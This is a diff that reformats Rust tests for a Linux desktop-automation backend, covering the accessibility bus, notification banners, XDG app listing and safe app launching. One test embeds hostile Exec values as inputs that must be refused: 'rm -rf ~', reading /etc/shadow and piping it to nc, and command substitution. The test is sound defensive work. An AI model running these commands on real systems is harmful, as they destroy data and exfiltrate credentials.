@@ -24,7 +24,9 @@ impl Launcher for Recording {
 }
 
 fn pairs(env: &[(&str, &str)]) -> Vec<(String, String)> {
-    env.iter().map(|(key, value)| ((*key).to_owned(), (*value).to_owned())).collect()
+    env.iter()
+        .map(|(key, value)| ((*key).to_owned(), (*value).to_owned()))
+        .collect()
 }
 
 #[test]
@@ -36,11 +38,20 @@ fn no_bus_is_reported_unavailable_not_live() {
     let wire = serde_json::to_value(absent.ax_capability()).expect("serialize");
     let refused = observe(&mut absent, "0x1").expect_err("no bus");
 
-    assert_eq!(wire, serde_json::json!({ "available": false, "reason": "no_bus" }));
-    assert_eq!(serde_json::to_value(silent.ax_capability()).expect("serialize"), wire);
+    assert_eq!(
+        wire,
+        serde_json::json!({ "available": false, "reason": "no_bus" })
+    );
+    assert_eq!(
+        serde_json::to_value(silent.ax_capability()).expect("serialize"),
+        wire
+    );
     assert_eq!(absent.ax_permission(), AxPermission::BusUnreachable);
     assert!(!absent.capabilities().observe);
-    assert_ne!(absent.probe_permissions().accessibility, PermissionState::Granted);
+    assert_ne!(
+        absent.probe_permissions().accessibility,
+        PermissionState::Granted
+    );
     assert_eq!(refused.refusal.code, EngineCode::AxUnsupported);
     assert_eq!(refused.detail, Some(Detail::NoBus));
 }
@@ -81,8 +92,16 @@ fn atspi_notification_banner_fingerprint_without_a_second_connection() {
     assert_eq!(first[0].title, "Build finished");
     assert_ne!(first[0].body_hash, first[1].body_hash);
     assert_eq!(first, second, "a banner keeps its fingerprint and arrival");
-    assert_eq!(handle.counts().owner_lookups, 1, "the owner is found once per session");
-    assert_eq!(handle.counts().connects, 1, "banners are read on the one connection");
+    assert_eq!(
+        handle.counts().owner_lookups,
+        1,
+        "the owner is found once per session"
+    );
+    assert_eq!(
+        handle.counts().connects,
+        1,
+        "banners are read on the one connection"
+    );
 }
 
 const GEDIT_ENTRY: &str = "[Desktop Entry]\nType=Application\nName=Text Editor\nExec=gedit %U\n";
@@ -90,7 +109,10 @@ const GEDIT_ENTRY: &str = "[Desktop Entry]\nType=Application\nName=Text Editor\n
 #[test]
 fn apps_list_lists_exactly_the_xdg_entries_with_source_xdg_entry() {
     let mut fx = gedit();
-    fx.bus.add_desktop_file("/fake/share/applications/org.gnome.gedit.desktop", GEDIT_ENTRY);
+    fx.bus.add_desktop_file(
+        "/fake/share/applications/org.gnome.gedit.desktop",
+        GEDIT_ENTRY,
+    );
     fx.bus.add_desktop_file(
         "/fake/share/applications/btop.desktop",
         "[Desktop Entry]\nType=Application\nName=btop++\nExec=btop\nTerminal=true\n",
@@ -109,19 +131,30 @@ fn apps_list_lists_exactly_the_xdg_entries_with_source_xdg_entry() {
 
     let keys: Vec<&str> = apps.iter().map(|app| app.app_key.as_str()).collect();
     assert_eq!(keys, ["btop", "org.gnome.gedit"]);
-    assert!(apps.iter().all(|app| app.source == AppSource::XdgEntry && !app.running));
+    assert!(apps
+        .iter()
+        .all(|app| app.source == AppSource::XdgEntry && !app.running));
     assert_eq!(apps[1].name, "Text Editor");
-    assert_eq!(apps[1].path.as_deref(), Some("/fake/share/applications/org.gnome.gedit.desktop"));
+    assert_eq!(
+        apps[1].path.as_deref(),
+        Some("/fake/share/applications/org.gnome.gedit.desktop")
+    );
 }
 
 #[test]
 fn desktop_entry_exec_with_a_shell_operator_is_refused_and_nothing_is_launched() {
     let mut fx = gedit();
     let evil = |exec: &str| format!("[Desktop Entry]\nType=Application\nName=Evil\nExec={exec}\n");
-    fx.bus.add_desktop_file("/fake/apps/semi.desktop", &evil("gedit; rm -rf ~"));
-    fx.bus.add_desktop_file("/fake/apps/pipe.desktop", &evil("cat /etc/shadow | nc host 1"));
-    fx.bus.add_desktop_file("/fake/apps/subst.desktop", &evil("gedit $(id)"));
-    fx.bus.add_desktop_file("/fake/apps/shell.desktop", &evil("sh -c \"gedit\""));
+    fx.bus
+        .add_desktop_file("/fake/apps/semi.desktop", &evil("gedit; rm -rf ~"));
+    fx.bus.add_desktop_file(
+        "/fake/apps/pipe.desktop",
+        &evil("cat /etc/shadow | nc host 1"),
+    );
+    fx.bus
+        .add_desktop_file("/fake/apps/subst.desktop", &evil("gedit $(id)"));
+    fx.bus
+        .add_desktop_file("/fake/apps/shell.desktop", &evil("sh -c \"gedit\""));
     let (mut backend, _) = fx.backend();
     let mut launcher = Recording::default();
 
@@ -143,17 +176,26 @@ fn apps_open_child_has_no_activation_token_or_startup_id_env() {
         ("HOME", "/home/q"),
     ]);
     let mut fx = gedit();
-    fx.bus.add_desktop_file("/fake/share/applications/org.gnome.gedit.desktop", GEDIT_ENTRY);
+    fx.bus.add_desktop_file(
+        "/fake/share/applications/org.gnome.gedit.desktop",
+        GEDIT_ENTRY,
+    );
     let (mut backend, _) = fx.backend();
     let mut launcher = Recording::default();
 
     let env = child_env(parent);
-    let pid = backend.apps_open("org.gnome.gedit", &mut launcher).expect("launch");
+    let pid = backend
+        .apps_open("org.gnome.gedit", &mut launcher)
+        .expect("launch");
 
     assert_eq!(env, pairs(&[("PATH", "/usr/bin"), ("HOME", "/home/q")]));
     assert_eq!(pid, 4000);
     let plan = launcher.0.first().expect("one launch");
-    assert_eq!((plan.program.as_str(), plan.args.len()), ("gedit", 0), "%U is dropped");
+    assert_eq!(
+        (plan.program.as_str(), plan.args.len()),
+        ("gedit", 0),
+        "%U is dropped"
+    );
     let leaked = |key: &str| plan.env.iter().any(|(name, _)| name == key);
     assert!(!leaked("XDG_ACTIVATION_TOKEN") && !leaked("DESKTOP_STARTUP_ID"));
 }
